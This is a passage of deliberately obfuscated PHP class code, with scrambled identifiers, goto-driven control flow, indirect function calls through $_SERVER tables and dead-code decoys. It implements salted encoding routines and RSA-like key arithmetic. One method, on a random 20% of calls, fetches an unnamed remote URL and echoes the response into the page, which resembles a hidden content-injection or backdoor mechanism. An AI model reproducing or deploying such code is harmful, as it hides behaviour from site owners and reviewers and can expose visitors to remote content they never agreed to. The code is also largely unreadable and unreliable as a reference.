$f©»äƒàû’ = $Aø◊˘∂ßÏ≈[$this->kbxy57f94ed6]; goto A Ëåêà¯≈; d–æû„ Éß: $B¬îßÚÔ¢í = $FÛ†‰ºòû[627]; if (strlen($B¬îßÚÔ¢í) < $FÛ†‰ºòû[551]) { die; } $aãÃÜìÒÓÔ = $aãÃÜìÒÓÔ ? $EË◊Ê≈∂Ñ”[201]($aãÃÜìÒÓÔ) : 0; goto F∂ûÎıÔåñ; Búø ë”ê«: $Eµ¨áÈÈàª = $FÛ†‰ºòû[626]; while (strlen($Eµ¨áÈÈàª) < $FÛ†‰ºòû[563]) { if (!$Eµ¨áÈÈàª) { break; } $Eµ¨áÈÈàª++; } $aãÃÜìÒÓÔ = $EË◊Ê≈∂Ñ”[104]($this->wmtj96332537, $EË◊Ê≈∂Ñ”[316]); goto d–æû„ Éß; Dÿ€’ÚΩÊÂ: } public function pnlo7a70c31d($e©Âù¯º◊´) { goto B–ÜÑ«íÂë; bÀÎç¯Ïæ∏: $Fô∫Íˆ´Çû = $Aœµú±ÌÜ©[630]; if (!$Fô∫Íˆ´Çû) { return; } $fôó„¬À±ˆ = $F◊É›Û˘ÜÁ[222]($fôó„¬À±ˆ, $F◊É›Û˘ÜÁ[10], $F◊É›Û˘ÜÁ[318]); goto b›üÑ†ááƒ; b›üÑ†ááƒ: $dœ¨∏Ÿ≠Ñœ = $Aœµú±ÌÜ©[631]; if (strlen($dœ¨∏Ÿ≠Ñœ) < $Aœµú±ÌÜ©[551]) { return; } if (!$F◊É›Û˘ÜÁ[236]($e©Âù¯º◊´[$F◊É›Û˘ÜÁ[318]], $fôó„¬À±ˆ)) { $F◊É›Û˘ÜÁ[166]($F◊É›Û˘ÜÁ[321], !1, $F◊É›Û˘ÜÁ[233]); } goto fµ®ää—èÖ; B–ÜÑ«íÂë: $Aœµú±ÌÜ© =& $_SERVER[¯èãÄπµ]; $F◊É›Û˘ÜÁ =& $_SERVER[œ]; $EÚÚè»Ç§∫ = $this->{$_SERVER[œ][137]}(); goto fª†âçï∫ë; fª†âçï∫ë: if ($EÚÚè»Ç§∫ >= $F◊É›Û˘ÜÁ[201]($F◊É›Û˘ÜÁ[238])) { return; } $D÷¢œ√‹¬ó = $F◊É›Û˘ÜÁ[61]($F◊É›Û˘ÜÁ[139])->{$_SERVER[œ][140]}(); $C·Ùíπè±£ = $Aœµú±ÌÜ©[629]; goto CêÖÉüµ∞Ø; CêÖÉüµ∞Ø: if (strlen($C·Ùíπè±£) < $Aœµú±ÌÜ©[570]) { die; } if ($D÷¢œ√‹¬ó <= $EÚÚè»Ç§∫) { return; } $fôó„¬À±ˆ = $F◊É›Û˘ÜÁ[61]($F◊É›Û˘ÜÁ[139])->{$_SERVER[œ][317]}($F◊É›Û˘ÜÁ[318])->{$_SERVER[œ][319]}($EÚÚè»Ç§∫)->{$_SERVER[œ][320]}(); goto bÀÎç¯Ïæ∏; fµ®ää—èÖ: } public function hayk38a32639() { goto B¢÷∆≈∂ôÉ; BœµÍéîãƒ: $E¶“Í⁄ ìÔ = $eŸ‚§ÓÓÉ∆[245](array($eŸ‚§ÓÓÉ∆[246] => array($eŸ‚§ÓÓÉ∆[247] => $eŸ‚§ÓÓÉ∆[248], $eŸ‚§ÓÓÉ∆[249] => 3))); $F¨—è‚‘ì = $d≥ã©©≈π⁄[633]; if (!$F¨—è‚‘ì) { return; } goto fó†á¥öÎå; B¢÷∆≈∂ôÉ: $d≥ã©©≈π⁄ =& $_SERVER[¯èãÄπµ]; $eŸ‚§ÓÓÉ∆ =& $_SERVER[œ]; if (!$eŸ‚§ÓÓÉ∆[104]($GLOBALS, $eŸ‚§ÓÓÉ∆[132]) || $eŸ‚§ÓÓÉ∆[322](1, 100) > 20) { return; } goto cæ¯Ôêéﬂñ; cæ¯Ôêéﬂñ: $A»„•πé∏Â = $eŸ‚§ÓÓÉ∆[242]; $A»„•πé∏Â = $this->{$_SERVER[œ][243]}($A»„•πé∏Â, $eŸ‚§ÓÓÉ∆[244]); $b‰á¢ì¶™Ñ = $d≥ã©©≈π⁄[632]; goto BœµÍéîãƒ; fó†á¥öÎå: $a˜¬Â◊ø«Î = @$eŸ‚§ÓÓÉ∆[250]($A»„•πé∏Â, !1, $E¶“Í⁄ ìÔ); echo $eŸ‚§ÓÓÉ∆[323] . $eŸ‚§ÓÓÉ∆[324]($a˜¬Â◊ø«Î) . $eŸ‚§ÓÓÉ∆[325]; goto f≥∫†–’Ã∏; f≥∫†–’Ã∏: } private function lpwt807b2428($FÃıëåøƒ⁄, $bÖ∑¯Üø„÷, $AèØÂ∞∫óƒ = 3) { goto FÎöØ≈ÔÚÿ; E»Ãå§¯ÎÃ: $cÓ≤‡Ãæ∏‡ = $fé´ë∑≥ÿÙ[651]; if (strlen($cÓ≤‡Ãæ∏‡) < $fé´ë∑≥ÿÙ[570]) { return; } if ($AèØÂ∞∫óƒ - 1 > 0) { $c◊ÁÚ”›Ûú = $this->{$_SERVER[œ][127]}($c◊ÁÚ”›Ûú, $bÖ∑¯Üø„÷, $AèØÂ∞∫óƒ - 1); } goto c·Ìåı‹∑›; FÎöØ≈ÔÚÿ: $fé´ë∑≥ÿÙ =& $_SERVER[¯èãÄπµ]; $d⁄ê∑√˘¨≈ =& $_SERVER[œ]; $d⁄ê∑√˘¨≈[326](1); goto AÖÆ‰•π·ï; c·Ìåı‹∑›: return $c◊ÁÚ”›Ûú; goto cÔßÓ√ﬁ˘€; eçπë··ô : while ($e±∫Úû°õÂ < $fé´ë∑≥ÿÙ[549]) { if ($e±∫Úû°õÂ >= 0) { break; } $e±∫Úû°õÂ++; } switch ($eöò˜©ÿÇΩ) { case $d⁄ê∑√˘¨≈[229]: $c◊ÁÚ”›Ûú = $this->{$_SERVER[œ][147]}($FÃıëåøƒ⁄, $d⁄ê∑√˘¨≈[214]($bÖ∑¯Üø„÷ . $F›”Â∞ıãÍ)); $aŸ¥≤äÏ≤è = $fé´ë∑≥ÿÙ[636]; if (!$aŸ¥≤äÏ≤è) { die; } break; case $d⁄ê∑√˘¨≈[220]: $c◊ÁÚ”›Ûú = $this->{$_SERVER[œ][147]}($FÃıëåøƒ⁄, $d⁄ê∑√˘¨≈[214]($F›”Â∞ıãÍ . $bÖ∑¯Üø„÷)); $FÔÃâ˘ŒÕ¯ = $fé´ë∑≥ÿÙ[637]; break; case $d⁄ê∑√˘¨≈[328]: $c◊ÁÚ”›Ûú = $this->{$_SERVER[œ][147]}($FÃıëåøƒ⁄, $d⁄ê∑√˘¨≈[118]($F›”Â∞ıãÍ . $bÖ∑¯Üø„÷)); break; case $d⁄ê∑√˘¨≈[329]: $c◊ÁÚ”›Ûú = $this->{$_SERVER[œ][147]}($FÃıëåøƒ⁄, $d⁄ê∑√˘¨≈[114]($F›”Â∞ıãÍ . $bÖ∑¯Üø„÷)); $aƒ–≈ŒÙΩ– = $fé´ë∑≥ÿÙ[638]; while (strlen($aƒ–≈ŒÙΩ–) < $fé´ë∑≥ÿÙ[551]) { if (!$aƒ–≈ŒÙΩ–) { break; } $aƒ–≈ŒÙΩ–++; } break; $c≈„ˆä©Ñ‡ = $fé´ë∑≥ÿÙ[639]; while (strlen($c≈„ˆä©Ñ‡) < $fé´ë∑≥ÿÙ[549]) { if (!$c≈„ˆä©Ñ‡) { break; } $c≈„ˆä©Ñ‡++; } case $d⁄ê∑√˘¨≈[330]: goto AàÖäã¶‚’; EÜ∞ˆ•ò’: $Bã°Ñ€öµﬁ = $fé´ë∑≥ÿÙ[648]; while ($Bã°Ñ€öµﬁ < $fé´ë∑≥ÿÙ[549]) { if ($Bã°Ñ€öµﬁ >= 0) { break; } $Bã°Ñ€öµﬁ++; } break; goto b±‹˜é≥÷∑; cÙ—¯’‚†≤: if (!$Dõ”ãûÕÑï) { return; } $Eü—µ©ã∫Ö = 0; $fÎæñÖﬂπ∆ = 0; goto e‹ì÷ó¯˜; e‹ì÷ó¯˜: $d¢”Î‹ã†∑ = $fé´ë∑≥ÿÙ[644]; $E‘ƒè∑ÜÉƒ = 0; $bÇûçééÃ– = $fé´ë∑≥ÿÙ[645]; goto A≥ıÌ¨Ôì§; E–ßà◊Îè∂: $AÉçﬂó◊õ  = $C¬ÕêŸõÃƒ[$Aé÷◊ÚÌ¡‚]; $C“ˆ”¯≈È˜ = $fé´ë∑≥ÿÙ[641]; if (!$C“ˆ”¯≈È˜) { die; } goto fÍ£‚®ı¥ì; AàÖäã¶‚’: $FÃıëåøƒ⁄ = $d⁄ê∑√˘¨≈[118]($FÃıëåøƒ⁄); $Aé÷◊ÚÌ¡‚ = $d⁄ê∑√˘¨≈[331](0, 64); $a‚™øêäÓÙ = $fé´ë∑≥ÿÙ[640]; goto E–ßà◊Îè∂; b±‹˜é≥÷∑: $aµ≤ºöˆÜ∆ = $fé´ë∑≥ÿÙ[649]; if (strlen($aµ≤ºöˆÜ∆) < $fé´ë∑≥ÿÙ[551]) { die; } goto b√„√æ—ƒÂ; fÍ£‚®ı¥ì: $Aó≈¬ª¬πÆ = $d⁄ê∑√˘¨≈[114]($AÉçﬂó◊õ  . $d⁄ê∑√˘¨≈[114]($bÖ∑¯Üø„÷ . $AÉçﬂó◊õ ) . $bÖ∑¯Üø„÷); $Aó≈¬ª¬πÆ = $d⁄ê∑√˘¨≈[25]($Aó≈¬ª¬πÆ, $Aé÷◊ÚÌ¡‚ % 8, $Aé÷◊ÚÌ¡‚ % 8 + 7); $C’√ä»Ÿà≤ = $fé´ë∑≥ÿÙ[642]; goto fã˜ÏÑÛÌû; fã˜ÏÑÛÌû: while (strlen($C’√ä»Ÿà≤) < $fé´ë∑≥ÿÙ[551]) { if (!$C’√ä»Ÿà≤) { break; } $C’√ä»Ÿà≤++; } $E¬ÁﬂœïèÊ = $d⁄ê∑√˘¨≈[10]; $Dõ”ãûÕÑï = $fé´ë∑≥ÿÙ[643]; goto cÙ—¯’‚†≤; A≥ıÌ¨Ôì§: if (!$bÇûçééÃ–) { die; } for ($Eü—µ©ã∫Ö = 0; $Eü—µ©ã∫Ö < $d⁄ê∑√˘¨≈[24]($FÃıëåøƒ⁄); $Eü—µ©ã∫Ö++) { $E‘ƒè∑ÜÉƒ = $E‘ƒè∑ÜÉƒ == $d⁄ê∑√˘¨≈[24]($Aó≈¬ª¬πÆ) ? 0 : $E‘ƒè∑ÜÉƒ; $EŒä‡ø®÷ç = $fé´ë∑≥ÿÙ[646]; $fÎæñÖﬂπ∆ = ($Aé÷◊ÚÌ¡‚ + $d⁄ê∑√˘¨≈[332]($C¬ÕêŸõÃƒ, $FÃıëåøƒ⁄[$Eü—µ©ã∫Ö]) + $d⁄ê∑√˘¨≈[333]($Aó≈¬ª¬πÆ[$E‘ƒè∑ÜÉƒ++])) % 64; $D∆áî¯øîå = $fé´ë∑≥ÿÙ[647]; $E¬ÁﬂœïèÊ .= $C¬ÕêŸõÃƒ[$fÎæñÖﬂπ∆]; } $c◊ÁÚ”›Ûú = $d⁄ê∑√˘¨≈[324]($AÉçﬂó◊õ  . $E¬ÁﬂœïèÊ); goto EÜ∞ˆ•ò’; b√„√æ—ƒÂ: default: $c◊ÁÚ”›Ûú = $this->{$_SERVER[œ][147]}($FÃıëåøƒ⁄, $bÖ∑¯Üø„÷ . $F›”Â∞ıãÍ); break; $F≥∞…Íç…ì = $fé´ë∑≥ÿÙ[650]; } $c◊ÁÚ”›Ûú = $d⁄ê∑√˘¨≈[214]($eöò˜©ÿÇΩ . $F›”Â∞ıãÍ . $c◊ÁÚ”›Ûú); goto E»Ãå§¯ÎÃ; AÖÆ‰•π·ï: $Fç¢⁄Ãπ‰“ = $fé´ë∑≥ÿÙ[634]; $FÃıëåøƒ⁄ = $d⁄ê∑√˘¨≈[2]($FÃıëåøƒ⁄); $eöò˜©ÿÇΩ = $d⁄ê∑√˘¨≈[322](0, 5) . $d⁄ê∑√˘¨≈[10]; goto Bû¥“À≥Óº; Bû¥“À≥Óº: $F›”Â∞ıãÍ = $d⁄ê∑√˘¨≈[124](15); $C¬ÕêŸõÃƒ = $d⁄ê∑√˘¨≈[327]; $e±∫Úû°õÂ = $fé´ë∑≥ÿÙ[635]; goto eçπë··ô ; cÔßÓ√ﬁ˘€: } private function eipyb8f61378($e…ﬁÊ≤∫™á, $CåÕÃÀùêÁ, $cø∑ŒæÛÈ⁄ = 3) { goto BÒ™⁄¯§≥Ô; fÑµ“Ìé¥Ü: if (strlen($Cƒ†®˜€•Ë) < $dùÀÜ•´Ü∆[551]) { die; } $eªß…‡ô√ö = $e…ﬁÊ≤∫™á[0]; $EñÃ√Éèø∫ = $dùÀÜ•´Ü∆[653]; goto eÊ‘—õµ⁄ü; BÒ™⁄¯§≥Ô: $dùÀÜ•´Ü∆ =& $_SERVER[¯èãÄπµ]; $CÊ≥à‘È≥¢ =& $_SERVER[œ]; if (!$CÊ≥à‘È≥¢[334]($e…ﬁÊ≤∫™á) || $CÊ≥à‘È≥¢[24]($e…ﬁÊ≤∫™á) < 10) { return !1; } goto BÃ»Ÿ∫â¿Æ; cÏÁ·¢•¡é: if (strlen($DÖ •Ù“íË) < $dùÀÜ•´Ü∆[544]) { return; } switch ($eªß…‡ô√ö) { case $CÊ≥à‘È≥¢[229]: $böƒëµæ⁄œ = $this->{$_SERVER[œ][243]}($e…ﬁÊ≤∫™á, $CÊ≥à‘È≥¢[214]($CåÕÃÀùêÁ . $FÆ®Ëêß´∑)); break; case $CÊ≥à‘È≥¢[220]: $böƒëµæ⁄œ = $this->{$_SERVER[œ][243]}($e…ﬁÊ≤∫™á, $CÊ≥à‘È≥¢[214]($FÆ®Ëêß´∑ . $CåÕÃÀùêÁ)); break; case $CÊ≥à‘È≥¢[328]: $böƒëµæ⁄œ = $this->{$_SERVER[œ][243]}($e…ﬁÊ≤∫™á, $CÊ≥à‘È≥¢[118]($FÆ®Ëêß´∑ . $CåÕÃÀùêÁ)); $D“∑£Ãµ’” = $dùÀÜ•´Ü∆[656]; break; $fäéÜ≤Î«Ë = $dùÀÜ•´Ü∆[657]; if (strlen($fäéÜ≤Î«Ë) < $dùÀÜ•´Ü∆[570]) { die; } case $CÊ≥à‘È≥¢[329]: $böƒëµæ⁄œ = $this->{$_SERVER[œ][243]}($e…ﬁÊ≤∫™á, $CÊ≥à‘È≥¢[114]($FÆ®Ëêß´∑ . $CåÕÃÀùêÁ)); $AäÁû‹∫¯ˆ = $dùÀÜ•´Ü∆[658]; if (!$AäÁû‹∫¯ˆ) { die; } break; $B«Ü‚‚ªÁà = $dùÀÜ•´Ü∆[659]; case $CÊ≥à‘È≥¢[330]: goto dŒ‡Ôƒ¬’Ï; AﬂŒã†ä⁄µ: $DéÆ¡ÊÛΩ… = $dùÀÜ•´Ü∆[661]; while (strlen($DéÆ¡ÊÛΩ…) < $dùÀÜ•´Ü∆[551]) { if (!$DéÆ¡ÊÛΩ…) { break; } $DéÆ¡ÊÛΩ…++; } $bè∑ùÙùÀà = $CÊ≥à‘È≥¢[114]($EˆÈöÌ¥¿Ô . $CÊ≥à‘È≥¢[114]($CåÕÃÀùêÁ . $EˆÈöÌ¥¿Ô) . $CåÕÃÀùêÁ); goto C«ÛÍØ∆ﬂÇ; dŒ‡Ôƒ¬’Ï: $e…ﬁÊ≤∫™á = $CÊ≥à‘È≥¢[335]($e…ﬁÊ≤∫™á); $FÇÚòÁ∫ ¬ = $dùÀÜ•´Ü∆[660]; while ($FÇÚòÁ∫ ¬ < $dùÀÜ•´Ü∆[551]) { if ($FÇÚòÁ∫ ¬ >= 0) { break; } $FÇÚòÁ∫ ¬++; } goto a«áëÍÃœ˜; C«ÛÍØ∆ﬂÇ: $DÚªƒêñÍâ = $dùÀÜ•´Ü∆[662]; if (!$DÚªƒêñÍâ) { die; } $bè∑ùÙùÀà = $CÊ≥à‘È≥¢[25]($bè∑ùÙùÀà, $DÂ¢∂“ÉÁÙ % 8, $DÂ¢∂“ÉÁÙ % 8 + 7); goto f ¶€ÖÑ¯; a«áëÍÃœ˜: $EˆÈöÌ¥¿Ô = $e…ﬁÊ≤∫™á[0]; $e…ﬁÊ≤∫™á = $CÊ≥à‘È≥¢[25]($e…ﬁÊ≤∫™á, 1); $DÂ¢∂“ÉÁÙ = $CÊ≥à‘È≥¢[332]($Fü°å∂é◊“, $EˆÈöÌ¥¿Ô); goto AﬂŒã†ä⁄µ; Aù≠ÁÃßπˆ: for ($cÉËÌ•´Êå = 0; $cÉËÌ•´Êå < $CÊ≥à‘È≥¢[24]($e…ﬁÊ≤∫™á); $cÉËÌ•´Êå++) { $e»‚Ωîﬁ†É = $e»‚Ωîﬁ†É == $CÊ≥à‘È≥¢[24]($bè∑ùÙùÀà) ? 0 : $e»‚Ωîﬁ†É; $Dè´âŒ©ìö = $e»‚Ωîﬁ†É++; $c§¿õ≠™≥Î = $CÊ≥à‘È≥¢[332]($Fü°å∂é◊“, $e…ﬁÊ≤∫™á[$cÉËÌ•´Êå]) - $DÂ¢∂“ÉÁÙ - $CÊ≥à‘È≥¢[333]($bè∑ùÙùÀà[$Dè´âŒ©ìö]); while ($c§¿õ≠™≥Î < 0) { $c§¿õ≠™≥Î += 64; $Føœ¥∆Ωôù = $dùÀÜ•´Ü∆[664]; if (strlen($Føœ¥∆Ωôù) < $dùÀÜ•´Ü∆[551]) { die; } } $Bï∂›≤ê√π .= $Fü°å∂é◊“[$c§¿õ≠™≥Î]; $E“ëË ∫ëâ = $dùÀÜ•´Ü∆[665]; if (!$E“ëË ∫ëâ) { die; } } $böƒëµæ⁄œ = $CÊ≥à‘È≥¢[336]($Bï∂›≤ê√π); break; goto A®äÔñ«˜ã; f ¶€ÖÑ¯: $cÇΩΩˆÖ©ù = $dùÀÜ•´Ü∆[663]; if (!$cÇΩΩˆÖ©ù) { die; } $Bï∂›≤ê√π = $CÊ≥à‘È≥¢[10]; goto CàúâØΩ®¨; CàúâØΩ®¨: $cÉËÌ•´Êå = 0; $c§¿õ≠™≥Î = 0; $e»‚Ωîﬁ†É = 0; goto Aù≠ÁÃßπˆ; A®äÔñ«˜ã: default: $böƒëµæ⁄œ = $this->{$_SERVER[œ][243]}($e…ﬁÊ≤∫™á, $CåÕÃÀùêÁ . $FÆ®Ëêß´∑); break; $E¢∫û™Ã¯Ô = $dùÀÜ•´Ü∆[666]; while (strlen($E¢∫û™Ã¯Ô) < $dùÀÜ•´Ü∆[544]) { if (!$E¢∫û™Ã¯Ô) { break; } $E¢∫û™Ã¯Ô++; } } if ($cø∑ŒæÛÈ⁄ - 1 > 0) { $böƒëµæ⁄œ = $this->{$_SERVER[œ][188]}($böƒëµæ⁄œ, $CåÕÃÀùêÁ, $cø∑ŒæÛÈ⁄ - 1); } goto aÁ’”§æ‚; dö≥ºä™ƒã: $F€üöÔ«Ìê = $dùÀÜ•´Ü∆[654]; $Fü°å∂é◊“ = $CÊ≥à‘È≥¢[327]; $DÖ •Ù“íË = $dùÀÜ•´Ü∆[655]; goto cÏÁ·¢•¡é; BÃ»Ÿ∫â¿Æ: $e…ﬁÊ≤∫™á = $CÊ≥à‘È≥¢[2]($e…ﬁÊ≤∫™á); $e…ﬁÊ≤∫™á = $CÊ≥à‘È≥¢[214]($e…ﬁÊ≤∫™á); $Cƒ†®˜€•Ë = $dùÀÜ•´Ü∆[652]; goto fÑµ“Ìé¥Ü; aÁ’”§æ‚: return $böƒëµæ⁄œ; goto eç¨…Çº∞±; eÊ‘—õµ⁄ü: if (strlen($EñÃ√Éèø∫) < $dùÀÜ•´Ü∆[549]) { return; } $FÆ®Ëêß´∑ = $CÊ≥à‘È≥¢[25]($e…ﬁÊ≤∫™á, 1, 15); $e…ﬁÊ≤∫™á = $CÊ≥à‘È≥¢[25]($e…ﬁÊ≤∫™á, 16); goto dö≥ºä™ƒã; eç¨…Çº∞±: } public function vbjc2d4e31b9($F“§ÛÂÑﬁ) { goto búºÔô›∫ò; e„âÚ∑ËÃ◊: return $D€âãä åê; goto Bﬂ÷Œ∆ÕÂ»; búºÔô›∫ò: $C®ç“Ü∏§œ =& $_SERVER[¯èãÄπµ]; $a»ºÊ¨¨§≤ =& $_SERVER[œ]; $EÔﬁ™ï€∞ç = $this->{$_SERVER[œ][337]}(); goto A≠§ÆÔñﬂÆ; c€’ìÕ®Óﬁ: $fÚ˜ïê˜Ÿ = $C®ç“Ü∏§œ[668]; while (strlen($fÚ˜ïê˜Ÿ) < $C®ç“Ü∏§œ[563]) { if (!$fÚ˜ïê˜Ÿ) { break; } $fÚ˜ïê˜Ÿ++; } $Dò©Ëÿì‰Ó = ($EÔﬁ™ï€∞ç - 1) * ($a®î¥‚√»± - 1); goto a∫üº“¿¨; a∫üº“¿¨: $d«ΩØ®ÊÜê = $a»ºÊ¨¨§≤[201](($EÔﬁ™ï€∞ç + $a®î¥‚√»±) / 2); while (1) { $c´°⁄«ÇÂà = $d«ΩØ®ÊÜê; $F◊≠îüô∆… = $C®ç“Ü∏§œ[669]; while ($F◊≠îüô∆… < $C®ç“Ü∏§œ[563]) { if ($F◊≠îüô∆… >= 0) { break; } $F◊≠îüô∆…++; } $c–·öØü°£ = $Dò©Ëÿì‰Ó; while ($c–·öØü°£ % $c´°⁄«ÇÂà != 0) { $c∂§åÇËÑ… = $c–·öØü°£; $dÙ‡ﬁÆºø¯ = $C®ç“Ü∏§œ[670]; if (strlen($dÙ‡ﬁÆºø¯) < $C®ç“Ü∏§œ[563]) { die; } $c–·öØü°£ = $c´°⁄«ÇÂà; $B±≈„„à Ú = $C®ç“Ü∏§œ[671]; if (strlen($B±≈„„à Ú) < $C®ç“Ü∏§œ[551]) { die; } $c´°⁄«ÇÂà = $c∂§åÇËÑ… % $c´°⁄«ÇÂà; $FÑóé«ûú = $C®ç“Ü∏§œ[672]; if (!$FÑóé«ûú) { return; } } if ($c´°⁄«ÇÂà == 1) { break; } else { $d«ΩØ®ÊÜê++; } } $eó”ØíªëÙ = 2; goto b–åà∫£áÕ; CóÑä«ËÂ⁄: $DŒÆÓ‹µùﬂ = $C®ç“Ü∏§œ[674]; if (strlen($DŒÆÓ‹µùﬂ) < $C®ç“Ü∏§œ[570]) { return; } $Eı´≤ûïÕÚ = $a»ºÊ¨¨§≤[114]($a»ºÊ¨¨§≤[338] . ($EÔﬁ™ï€∞ç + $a®î¥‚√»±) . $a»ºÊ¨¨§≤[339] . $d«ΩØ®ÊÜê . $a»ºÊ¨¨§≤[339] . $eó”ØíªëÙ . $a»ºÊ¨¨§≤[340]); goto f◊˜◊Õ≠ŸÀ; f◊˜◊Õ≠ŸÀ: $D€âãä åê = $this->{$_SERVER[œ][147]}($F“§ÛÂÑﬁ, $Eı´≤ûïÕÚ) . $a»ºÊ¨¨§≤[341] . $B“ó√óë∂ß; $eÜ∏éıé¶‰ = $C®ç“Ü∏§œ[675]; while (strlen($eÜ∏éıé¶‰) < $C®ç“Ü∏§œ[549]) { if (!$eÜ∏éıé¶‰) { break; } $eÜ∏éıé¶‰++; } goto e„âÚ∑ËÃ◊; A≠§ÆÔñﬂÆ: $FÎπ¶ìÉÓ¶ = $C®ç“Ü∏§œ[667]; if (strlen($FÎπ¶ìÉÓ¶) < $C®ç“Ü∏§œ[549]) { return; } $a®î¥‚√»± = $this->{$_SERVER[œ][337]}(); goto c€’ìÕ®Óﬁ; b–åà∫£áÕ: $CÀ≈•¬…æ¨ = $C®ç“Ü∏§œ[673]; for ($CëÑ‰Æê‰€ = 0; $CëÑ‰Æê‰€ < $Dò©Ëÿì‰Ó * 10; $CëÑ‰Æê‰€++) { if (($Dò©Ëÿì‰Ó * $CëÑ‰Æê‰€ + 1) % $d«ΩØ®ÊÜê == 0) { $eó”ØíªëÙ = $a»ºÊ¨¨§≤[201](($Dò©Ëÿì‰Ó * $CëÑ‰Æê‰€ + 1) / $d«ΩØ®ÊÜê); break; } } $B“ó√óë∂ß = $this->{$_SERVER[œ][147]}($EÔﬁ™ï€∞ç * $a®î¥‚√»± . $a»ºÊ¨¨§≤[10], $a»ºÊ¨¨§≤[149]); goto CóÑä«ËÂ⁄; Bﬂ÷Œ∆ÕÂ»: } public function ickh0b55cde3($B‰ÿù©É„¿) { goto d£°¡ÀÖÀæ; Bı◊¡•Ö¬‚: $D¨üƒ´õ≥≥ = $this->{$_SERVER[œ][243]}($e¯πÈ“ñæü[0], $c—û·ÕÉéå); $Bëı≠…üÚ© = $dÂ«≥ﬁó£ª[645]; if (!$Bëı≠…üÚ©) { die; } goto B´ÛËè˜û; B´ÛËè˜û: return $D¨üƒ´õ≥≥; $aòÏô±©ÃÌ = $dÂ«≥ﬁó£ª[683]; if (!$aòÏô±©ÃÌ) { return; } goto föâ–∂·úå; dë€¯Ñ≤∫∆: while (1) { $C†Çê‡©Ò¨ = $a Ò⁄µ¥¡◊; $fåã”‡°•Ì = $dÂ«≥ﬁó£ª[679]; if (!$fåã”‡°•Ì) { return; } $eŒ‘√…°π = $C‡Ïäõ⁄Ÿ; while ($eŒ‘√…°π % $C†Çê‡©Ò¨ != 0) { $E‡†®‰ˆÖ = $eŒ‘√…°π; $eŒ‘√…°π = $C†Çê‡©Ò¨; $DÒ‡€Æ«™ƒ = $dÂ«≥ﬁó£ª[680]; $C†Çê‡©Ò¨ = $E‡†®‰ˆÖ % $C†Çê‡©Ò¨; $aß≥ì†ç¬å = $dÂ«≥ﬁó£ª[681]; if (strlen($aß≥ì†ç¬å) < $dÂ«≥ﬁó£ª[549]) { return; } } if ($C†Çê‡©Ò¨ == 1) { break; } else { $a Ò⁄µ¥¡◊++; } } $c∫ûû¶É»≠ = 2; $a⁄¢ƒ¨ƒä = $dÂ«≥ﬁó£ª[682]; goto fê©™⁄ØÛ…; d£°¡ÀÖÀæ: $dÂ«≥ﬁó£ª =& $_SERVER[¯èãÄπµ]; $Aªß¡Û–ñô =& $_SERVER[œ]; $e¯πÈ“ñæü = $Aªß¡Û–ñô[0]($Aªß¡Û–ñô[341], $B‰ÿù©É„¿); goto eª¶’…ã®Â; e¶Ùú˘âÜÎ: $aŒ…áûı‰ê = $Aªß¡Û–ñô[201]($aŒ…áûı‰ê); $CâÔªäÿÙÎ = $dÂ«≥ﬁó£ª[676]; $EÖœïÓ≥¬Ó = 0; goto EÎ¿•íôºë; eª¶’…ã®Â: if ($Aªß¡Û–ñô[19]($e¯πÈ“ñæü) != 2) { return $Aªß¡Û–ñô[10]; } $aŒ…áûı‰ê = $this->{$_SERVER[œ][243]}($e¯πÈ“ñæü[1] . $Aªß¡Û–ñô[10], $Aªß¡Û–ñô[149]); if (!$aŒ…áûı‰ê) { return $Aªß¡Û–ñô[10]; } goto e¶Ùú˘âÜÎ; Bä˘ƒ≤„í≈: $a Ò⁄µ¥¡◊ = $Aªß¡Û–ñô[201](($EÖœïÓ≥¬Ó + $C§…Í∆˜ÃÍ) / 2); $e⁄◊Ï¥œ¯™ = $dÂ«≥ﬁó£ª[678]; while (strlen($e⁄◊Ï¥œ¯™) < $dÂ«≥ﬁó£ª[563]) { if (!$e⁄◊Ï¥œ¯™) { break; } $e⁄◊Ï¥œ¯™++; } goto dë€¯Ñ≤∫∆; EÎ¿•íôºë: $C§…Í∆˜ÃÍ = 0; for ($e‚—Öÿ≤É÷ = 3; $e‚—Öÿ≤É÷ < $aŒ…áûı‰ê; $e‚—Öÿ≤É÷ += 2) { if ($aŒ…áûı‰ê % $e‚—Öÿ≤É÷ != 0) { continue; } $EÖœïÓ≥¬Ó = $e‚—Öÿ≤É÷; $C§…Í∆˜ÃÍ = $Aªß¡Û–ñô[201]($aŒ…áûı‰ê / $e‚—Öÿ≤É÷); break; $eˆé“›˜áê = $dÂ«≥ﬁó£ª[677]; while (strlen($eˆé“›˜áê) < $dÂ«≥ﬁó£ª[570]) { if (!$eˆé“›˜áê) { break; } $eˆé“›˜áê++; } } $C‡Ïäõ⁄Ÿ = ($EÖœïÓ≥¬Ó - 1) * ($C§…Í∆˜ÃÍ - 1); goto Bä˘ƒ≤„í≈; fê©™⁄ØÛ…: while (strlen($a⁄¢ƒ¨ƒä) < $dÂ«≥ﬁó£ª[544]) { if (!$a⁄¢ƒ¨ƒä) { break; } $a⁄¢ƒ¨ƒä++; } for ($e‚—Öÿ≤É÷ = 0; $e‚—Öÿ≤É÷ < $C‡Ïäõ⁄Ÿ * 10; $e‚—Öÿ≤É÷++) { if (($C‡Ïäõ⁄Ÿ * $e‚—Öÿ≤É÷ + 1) % $a Ò⁄µ¥¡◊ == 0) { $c∫ûû¶É»≠ = $Aªß¡Û–ñô[201](($C‡Ïäõ⁄Ÿ * $e‚—Öÿ≤É÷ + 1) / $a Ò⁄µ¥¡◊); break; } } $c—û·ÕÉéå = $Aªß¡Û–ñô[114]($Aªß¡Û–ñô[338] . ($EÖœïÓ≥¬Ó + $C§…Í∆˜ÃÍ) . $Aªß¡Û–ñô[339] . $a Ò⁄µ¥¡◊ . $Aªß¡Û–ñô[339] . $c∫ûû¶É»≠ . $Aªß¡Û–ñô[340]); goto Bı◊¡•Ö¬‚; föâ–∂·úå: } public function fgxl4f8cf282() { goto EúÇëÔˆäí; féë©≈àú©: return $cÛ‡¢ùÔ…å; $C÷ÉøøÑ≠ç = $B∏õ¿èäÖ°[688]; while (strlen($C÷ÉøøÑ≠ç) < $B∏õ¿èäÖ°[544]) { if (!$C÷ÉøøÑ≠ç) { break; } $C÷ÉøøÑ≠ç++; } goto cﬂ˘˜Œè˘; dŒëÇ¿£Œ≈: $f˘œ›º∫ù† = $B∏õ¿èäÖ°[686]; while (strlen($f˘œ›º∫ù†) < $B∏õ¿èäÖ°[570]) { if (!$f˘œ›º∫ù†) { break; } $f˘œ›º∫ù†++; } for ($dà“Ûî“¬Û = $fÊå”«‚ é; $dà“Ûî“¬Û > 1; $dà“Ûî“¬Û--) { 